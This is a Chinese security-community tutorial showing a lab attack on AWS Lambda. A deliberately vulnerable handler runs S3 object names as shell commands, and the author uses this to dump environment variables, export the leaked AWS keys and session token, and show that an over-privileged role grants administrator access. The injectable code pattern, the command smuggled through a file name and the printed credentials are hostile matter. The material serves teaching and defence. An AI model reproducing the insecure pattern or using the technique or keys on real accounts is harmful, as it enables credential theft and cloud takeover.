# 深入解析 AWS Lambda风险：无服务器架构下的云安全实践-先知社区

> **来源**: https://xz.aliyun.com/news/17250  
> **文章ID**: 17250

---

# 深入解析 AWS Lambda风险：无服务器架构下的云安全实践

## 前言

AWS Lambda 作为无服务器计算（Serverless Computing）的代表，为开发者提供了极大的便利。然而，Lambda 的无状态执行模式和自动扩展能力，也引发了一系列问题。我们可以利用其特性，达到rce的效果

本篇文章中，深入探讨 AWS Lambda 相关的安全风险，分析可能的攻击场景

适合基础入门的小白

## Aws Lambda

本节将介绍 AWSLambda。AmazonWebServices(AWS)Lambda 是一种计算服务，允许你在无需预置或管理服务器的情况下运行码。Lambda 会自动管理运行代码所需的资源，并提供高可用性、扩展性和安全性功能。使用 Lambda，你只需为实际消耗的计算时间付费，没有任何前期成本或长期承诺。

### 环境搭建

```
https://us-east-1.console.aws.amazon.com/lambda/home?region=us-east-1#/discover
```

访问这个地址  
![](images/20250318141832-d144d6a0-03c0-1.png)  
然后我们创建一个函数

首先选择语言类型

![](images/20250318141834-d22bf8bb-03c0-1.png)  
我这里选择 python

输入函数名后就可以直接创建了

![](images/20250318141835-d2ca7151-03c0-1.png)

这个选项和我们后面的利用有关系，暂时不需要管

创建好了之后我们可以添加一个触发器

触发器就是 emmm 这样理解

就是你干了一件事，这函数就要执行一遍，比如我处理数据，我输入 1+1，后端的函数就需要把我的结果计算一遍

这里我们创建一个 s3 的桶

访问<https://us-east-1.console.aws.amazon.com/s3/get-started?region=us-east-1&bucketType=general>

![](images/20250318141836-d39182df-03c0-1.png)

只需要选择桶的名称就 ok 了

但是你的名称不能重复，因为这个桶的地址是唯一的，而且大家都能访问得到，只是权限问题

![](images/20250318141838-d466413e-03c0-1.png)  
可以上传你的文件

然后我们设置触发点  
![](images/20250318141839-d58979ad-03c0-1.png)  
选择我们的 S3 桶  
![](images/20250318141842-d723a487-03c0-1.png)  
可以选择什么时候触发

### Lambda 风险点

注意，这里只是来说明本质，实战可能有各种各样的方法，但是本质原理大概是这样的

首先是一个不安全的 Lambda 函数

```
import json
import os
def lambda_handler(event, context):
    for i in event['Records']:
        getObjectName = i['s3']['object']['key']
        getSplitObjectName = getObjectName.split('.')
        os.system(getSplitObjectName[0])
```

总的来说就是从 S3 事件中提取文件名，然后根据文件名的第一部分来执行一个系统命令。

比如我们上传一个 pwd.txt，那么就会执行 pwd 命令

为了方便测试，当然官方也推出了一个功能来给我们测试

![](images/20250318141844-d82e3357-03c0-1.png)  
我们可以直接编辑事件

然后其中也内置了一些事件便于我们去测试

![](images/20250318141845-d91119cf-03c0-1.png)

会得到一个 JSON

```
{
  "Records": [
    {
      "eventVersion": "2.0",
      "eventSource": "aws:s3",
      "awsRegion": "us-east-1",
      "eventTime": "1970-01-01T00:00:00.000Z",
      "eventName": "ObjectCreated:Put",
      "userIdentity": {
        "principalId": "EXAMPLE"
      },
      "requestParameters": {
        "sourceIPAddress": "127.0.0.1"
      },
      "responseElements": {
        "x-amz-request-id": "EXAMPLE123456789",
        "x-amz-id-2": "EXAMPLE123/5678abcdefghijklambdaisawesome/mnopqrstuvwxyzABCDEFGH"
      },
      "s3": {
        "s3SchemaVersion": "1.0",
        "configurationId": "testConfigRule",
        "bucket": {
          "name": "example-bucket",
          "ownerIdentity": {
            "principalId": "EXAMPLE"
          },
          "arn": "arn:aws:s3:::example-bucket"
        },
        "object": {
          "key": "pwd.txt",
          "size": 1024,
          "eTag": "0123456789abcdef0123456789abcdef",
          "sequencer": "0A1B2C3D4E5F678901"
        }
      }
    }
  ]
}
```

我们修改 key 为 pwd.txt

执行后我们可以查看结果

![](images/20250318141847-da06b2ff-03c0-1.png)

成功执行，还可以执行其他的命令，如 whoami

![](images/20250318141849-db00037e-03c0-1.png)  
也是可以的

当然这只是有安全风险的本质，现实情况可能复杂很多

### 漏洞利用

如果存在这样的情况，我们可以执行 env 命令，读取环境变量，因为变量一般包含我们的 key 和 id

如果可以读取 env，因为我们一般是不能像在控制台看到命令的，就需要把结果外带出来，但是说实话还是很牵强，主要是分析这个点的风险，我也懒得改了(重在思路)

直接执行 env

![](images/20250318141851-dc36f5cc-03c0-1.png)  
可以看见是有我们的 key 和 id 的  
![](images/20250318141854-de257697-03c0-1.png)  
然后还有我们的 token，三要素已经集齐了

然后登录了好久好久

最后才发现必须加一个区

```
root@VM-16-17-ubuntu:~# export AWS_ACCESS_KEY_ID=ASIA6K5V74UJNNPET6Z5
root@VM-16-17-ubuntu:~# export AWS_SECRET_ACCESS_KEY=BTw4wZ8jeQ0ywrKhYMS55XhBlWJ4WXliqKmImz64
root@VM-16-17-ubuntu:~# export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJIMEYCIQChqtJ857Q9sUH9aY+55kVo6g54+SAPHR7wof7VDtgTSgIhANrPVrYvsClXXoqTSsusOr3tP0sdlJWoYmnezwsQDv4oKtwCCF4QABoMOTg1NTM5Nzk4MjkwIgzYEnXvmz7tDQFnCt8quQL/97NpIdIIm/4MhbYGXq/ACjIv4p72Ok5LgY3ynIvxvhInMo21BPcZxcMphQsgcmlL9PmgmnkNeLb/GGDTTo9EvtaN7MqDAlJ1tB2Dig/7KFcTH7+7YBVqe64PuANSxsCLMc4/ljbB0eYgkso3Q9lMlBKPN8Nb0dUPgdZSMH+oZu1/w2mJqSlNRL/Yo7JY+1/Y9YUHhnPCm/3yz7qJ/n7C3GlKqQwDAxhrCuuVLIICipaVKN1+15pcOjyxnfXwZyc53EhM9/bsOhqHmitXu8R824opt5unTo/0FAqViD4i2lLnd1KDp+/W+Hzi2cRbt2p1N0yd+1CpnVuY6EztkeLhHch36fV5vj3iP7hgRfkpAX4FIZN/Jd6tMFWLlfo0uK6mH8kK9PEkSZYT0pB2qKx47jU3NS15jiY2MKn2v7sGOp0BYmI6qToFn1DoCZCgdKHWHzHp5a9Wdas+/gQLFRGyzgj9IKrIQeVxvEBhMcMDz0HO+HEnUtvycwSL/YfttLgPOdUwjeFkoT8vtrL/RgRVTEozYdv5Yt1n0jRH9K9X2vfSHEgtI2fOOgdjCegbr7ZshvmoXudc8nCBb+U5mLnuNK5WfduSg2aYT/NKcY2P18U5eZOxitUxyWmPgM0KPw==
root@VM-16-17-ubuntu:~# aws sts get-caller-identity


Could not connect to the endpoint URL: "https://sts.IQoJb3JpZ2luX2VjEIb//////////wEaCXVzLWVhc3QtMSJIMEYCIQChqtJ857Q9sUH9aY+55kVo6g54+SAPHR7wof7VDtgTSgIhANrPVrYvsClXXoqTSsusOr3tP0sdlJWoYmnezwsQDv4oKtwCCF4QABoMOTg1NTM5Nzk4MjkwIgzYEnXvmz7tDQFnCt8quQL/97NpIdIIm/4MhbYGXq/ACjIv4p72Ok5LgY3ynIvxvhInMo21BPcZxcMphQsgcmlL9PmgmnkNeLb/GGDTTo9EvtaN7MqDAlJ1tB2Dig/7KFcTH7+7YBVqe64PuANSxsCLMc4/ljbB0eYgkso3Q9lMlBKPN8Nb0dUPgdZSMH+oZu1/w2mJqSlNRL/Yo7JY+1/Y9YUHhnPCm/3yz7qJ/n7C3GlKqQwDAxhrCuuVLIICipaVKN1+15pcOjyxnfXwZyc53EhM9/bsOhqHmitXu8R824opt5unTo/0FAqViD4i2lLnd1KDp+/W+Hzi2cRbt2p1N0yd+1CpnVuY6EztkeLhHch36fV5vj3iP7hgRfkpAX4FIZN/Jd6tMFWLlfo0uK6mH8kK9PEkSZYT0pB2qKx47jU3NS15jiY2MKn2v7sGOp0BYmI6qToFn1DoCZCgdKHWHzHp5a9Wdas+/gQLFRGyzgj9IKrIQeVxvEBhMcMDz0HO+HEnUtvycwSL/YfttLgPOdUwjeFkoT8vtrL/RgRVTEozYdv5Yt1n0jRH9K9X2vfSHEgtI2fOOgdjCegbr7ZshvmoXudc8nCBb+U5mLnuNK5WfduSg2aYT/NKcY2P18U5eZOxitUxyWmPgM0KPw==.amazonaws.com"
```

加上我们的 region 参数就 ok 了

```
root@VM-16-17-ubuntu:~# aws sts get-caller-identity --region us-east-1
{
    "UserId": "AROA6K5V74UJGVOV7CREQ:Test",
    "Account": "985539798290",
    "Arn": "arn:aws:sts::985539798290:assumed-role/Test-role-am3k6gl0/Test"
}
```

然后执行一波命令发现什么权限都没有

```
root@VM-16-17-ubuntu:~# aws iam get-role --role-name Test-role-am3k6gl0

An error occurred (AccessDenied) when calling the GetRole operation: User: arn:aws:sts::985539798290:assumed-role/Test-role-am3k6gl0/Test is not authorized to perform: iam:GetRole on resource: role Test-role-am3k6gl0 because no identity-based policy allows the iam:GetRole action
```

难崩，连自己是啥都看不了，我们可以看看默认有啥权限，得去控制台了

```
https://us-east-1.console.aws.amazon.com/iam/home?region=us-east-1#/roles
```

![](images/20250318141855-defa4901-03c0-1.png)  
可以看到有三个角色

![](images/20250318141857-dfe80186-03c0-1.png)  
我们获取的角色就一个权限，然后啥都没有了.....

所以这种是不能使用的

回到我们搭建环境的那里   
![](images/20250318141857-dfe80186-03c0-1.png)  
这里可以选择角色，我们可以选择新建一个角色

![](images/20250318141900-e1c47cac-03c0-1.png)  
然后可以选择权限

但是这个权限还是太低，我们还可以新建一个角色  
![](images/20250318141902-e2c7edee-03c0-1.png)  
直接给最高的权限

![](images/20250318141903-e3d30be5-03c0-1.png)

然后创建函数的时候直接选我们刚刚创建的角色

![](images/20250318141905-e481b7cb-03c0-1.png)

然后一样的步骤获取 key 和 id，然后登录

然后我们再次查询一下自己的权限

```
root@VM-16-17-ubuntu:~# aws iam list-attached-role-policies --role-name Test
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

可以看到得到的 key 和 id 就是任意用户的权限了

参考<https://uzzju.com/post/65.java>
